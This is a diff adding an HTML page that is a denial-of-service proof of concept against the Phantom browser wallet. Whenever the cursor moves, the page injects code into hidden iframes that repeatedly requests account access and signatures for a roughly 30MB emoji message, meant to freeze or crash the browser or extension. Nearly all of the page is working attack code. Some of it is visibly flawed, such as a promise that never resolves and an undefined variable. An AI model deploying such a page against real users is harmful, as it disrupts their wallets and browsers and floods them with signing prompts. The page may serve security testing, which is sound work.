@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>DoS Iframe Test - Phantom Wallet</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+      text-align: center;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 16px 0; font-size: 24px; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 300px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; }
+    iframe {
+      display: none; /* Hidden iframes to avoid visual clutter */
+      height: 0;
+      width: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>DoS Iframe Test - Phantom Wallet</h1>
+    <p>Move your cursor over the page to trigger multiple signing requests via iframes.</p>
+    <p class="warn">Warning: This may freeze or crash your browser/extension. Load at your own risk!</p>
+    <p>Test uses ~30MB messages across 5 iframes.</p>
+    <pre id="output">Ready. Move your cursor to start the DoS test.</pre>
+  </div>
+  <!-- Hidden iframes for parallel execution -->
+  <iframe id="iframe1" src="about:blank"></iframe>
+  <iframe id="iframe2" src="about:blank"></iframe>
+  <iframe id="iframe3" src="about:blank"></iframe>
+  <iframe id="iframe4" src="about:blank"></iframe>
+  <iframe id="iframe5" src="about:blank"></iframe>
+
+  <script>
+    // CONFIG
+    const TEST_MESSAGE_LENGTH = 30000000; // ~30MB message
+    const IFRAME_COUNT = 5;
+
+    const outEl = document.getElementById('output');
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Prepare the emoji-based message
+    let testMessage = null;
+    window.addEventListener('load', () => {
+      log(`Preparing ${TEST_MESSAGE_LENGTH} character message with emojis...`);
+      const emojis = ['☠️', '😈', '💀', '🎃', '👻'];
+      testMessage = new Array(Math.floor(TEST_MESSAGE_LENGTH / 5))
+        .fill()
+        .map(() => emojis[Math.floor(Math.random() * emojis.length)])
+        .join('');
+      log('Message prepared. Move your cursor to trigger the DoS test.');
+    });
+
+    // Mock-sign function
+    function mockSign(index) {
+      const fakeSig = `0xMOCKSIG_${index}_${Math.random().toString(36).slice(2,10)}`;
+      return Promise.resolve(fakeSig);
+    }
+
+    // Sign function with iframe injection
+    async function signInIframe(iframeId, index) {
+      return new Promise((resolve) => {
+        const iframe = document.getElementById(iframeId);
+        const code = `
+          (async () => {
+            try {
+              if (!window.ethereum) throw new Error('No wallet');
+              const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+              const sig = await window.ethereum.request({
+                method: 'personal_sign',
+                params: ['${testMessage}', accounts[0]]
+              });
+              parent.postMessage({ type: 'signResult', index, sig }, '*');
+            } catch (err) {
+              parent.postMessage({ type: 'signError', index, error: err.message || err }, '*');
+            }
+          })();
+        `;
+        iframe.contentWindow.eval(code);
+      });
+    }
+
+    // Handle iframe messages
+    window.addEventListener('message', (event) => {
+      if (event.data.type === 'signResult') {
+        log(`✅ Iframe ${event.data.index} signed: ${event.data.sig.slice(0, 20)}...`);
+      } else if (event.data.type === 'signError') {
+        log(`❌ Iframe ${event.data.index} failed: ${event.data.error}. Using mock.`);
+        log(`✅ Mock signed [${event.data.index}]: ${mockSign(event.data.index)}`);
+      }
+    });
+
+    // Trigger signing on mouseover with loop
+    function triggerDos() {
+      log('Cursor detected. Launching DoS via iframes...');
+      const promises = [];
+      for (let i = 1; i <= IFRAME_COUNT; i++) {
+        promises.push(signInIframe(`iframe${i}`, i));
+      }
+      Promise.all(promises).then(() => {
+        log('Iframe cycle complete. Restarting...');
+        setTimeout(triggerDos, 1000); // Restart after 1 second
+      }).catch(err => {
+        log('Error in iframe cycle:', err.message || err);
+      });
+    }
+
+    // Attach onmouseover handler
+    document.body.addEventListener('mouseover', () => {
+      if (!testMessage) return; // Wait for message prep
+      triggerDos();
+    });
+  </script>
+</body>
+</html>
